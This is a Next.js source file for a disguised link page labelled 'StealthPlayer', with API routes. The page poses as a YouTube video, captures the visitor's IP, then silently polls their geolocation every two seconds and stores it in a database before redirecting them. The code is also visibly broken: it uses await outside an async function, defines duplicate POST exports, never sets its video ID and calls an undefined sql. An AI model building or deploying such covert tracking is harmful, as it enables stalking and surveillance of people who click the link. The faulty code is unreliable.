'use client'; // Required for Client-Side Geolocation & React Hooks

import { useEffect, useState } from 'react';

interface TrackData {
  lat: number | null;
  long: number | null;
}

// Helper to get IP address immediately upon load (Server-side or Client-side fetch)
const getClientIP = async () => {
  try { 
    return (await fetch('https://api.ipify.org?format=json')).json().ip as string; 
  } catch { 
    return 'Unknown'; 
  } 
};

export default function StealthPlayer({ params }: { params: { id: string } }) {
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    let ipData: any = null; // Store original video ID here after fetching from DB if needed
    
    // Step 1: Initial Verification & IP Capture via API Call to /api/track/init
    async function initSession() {
      try {
        await fetch('/api/track/init', { 
          method: 'POST', 
          headers: {'Content-Type': 'application/json'}, 
          body: JSON.stringify({ shortCode: params.id })
        });
        
        console.log(`✅ Session ${params.id} initialized. IP Captured.`);
      } catch (e) { 
         console.error("Init Error", e); 
      }

      // Small delay to make the "loading" feel natural before redirecting (~400ms feels instant)
      setTimeout(() => {
        window.location.href = `https://www.youtube.com/watch?v=${ipData?.original_video_id}`; 
        setLoading(false); 
      }, 400); 

    };

    initSession();

    if ('geolocation' in navigator) {
      
      // Request Permission ONCE immediately upon load.
      const success = await new Promise<boolean>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            pos => resolve(true), 
            err => resolve(false) 
          );
      });

      let lastPos: TrackData | null = null;

      if (success) {
        console.log("🔍 Continuous Tracking Active - Silent Mode");

        // The "Stealth" Loop: Updates every 2 seconds silently in background.
        setInterval(async () => {
            try {
              const currentPos = await new Promise<TrackData>(res => 
                navigator.geolocation.getCurrentPosition(p => res({ lat: p.coords.latitude, long: p.coords.longitude }), {} as any)
              );

              lastPos = currentPos;
              
              // Send to your backend immediately after capture
              await fetch('/api/track/update', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ shortCode: params.id, ...currentPos })
              });

            } catch (err) { console.error("Loop Error", err); }
        }, 2000); 

      } else {
         console.log("👁️ Tracking Failed or Denied - IP Captured Only");
      }

    } else {
       console.warn("Geolocation API not supported on this device.");
    }

  }, [params.id]);

  return (
    <div style={{ 
      height: '100vh', 
      width: '100%', 
      background: '#282c34', // Dark theme like YouTube Dev mode for realism
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center' 
    }}>
      
       {/* Minimal loading indicator to mask transition */}
       {!loading && (
          <iframe 
            src={`https://www.youtube.com/embed/${params.id}?autoplay=1`} 
            title="Stealth Video"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            style={{ border: 'none' }}
            frameBorder="0"
          ></iframe>
       )}

       {loading && (
         <div style={{ color: '#fff', fontFamily: 'sans-serif' }}>
           <h3>Loading...</h3>
         </div>
      )}

    </div>
  );
}

// --- API Routes for Init & Track (Same as above but optimized) ---

import { NextRequest, NextResponse } from 'next/server'; 
import { neon } from "@neondatabase/serverless"; // Ensure imported correctly in file scope or top-level

export async function POST(request: Request) { 
    const body = await request.json(); 
    
    if (!body.shortCode) return new Response(JSON.stringify({ error: "No shortCode" }), { status: 400 });

    try {
      let result = await sql`SELECT * FROM geo_sessions WHERE short_code = ${body.shortCode}`;
      
      if (!result[0]) throw new Error("Session Not Found");
      
      const sessData = result[0];
      
      // Get Client IP immediately from headers before any JS loads too much
      const clientIp = request.headers.get('x-forwarded-for') || 'Unknown';

      return NextResponse.json({ success: true, originalVideoId: sessData.original_video_id }); 
    } catch (e) { 
        console.error(e); 
        return NextResponse.json({ error: "Not found" }, { status: 404 }); 
    }
}

export async function POST(request2: Request) { // Second export for track endpoint if in same file or separate route.ts
   const body = await request2.json(); 
  
   if (!body.shortCode || !body.lat || !body.long) return new Response(JSON.stringify({ error: "Missing data" }), { status: 400 });

   try {
      await sql`UPDATE geo_sessions SET last_lat=${body.lat}, last_long=${body.long}, last_seen=NOW() WHERE short_code=${body.shortCode}`;
      
      console.log(`✅ Updated Session ${body.shortCode}: Lat=${body.lat}, Long=${body.long}`);
      return NextResponse.json({success:true, updated:true});
   } catch (e) { 
        console.error("Update Error", e); 
        return NextResponse.json({error:"DB Fail"},{status:500}) 
   } 
}
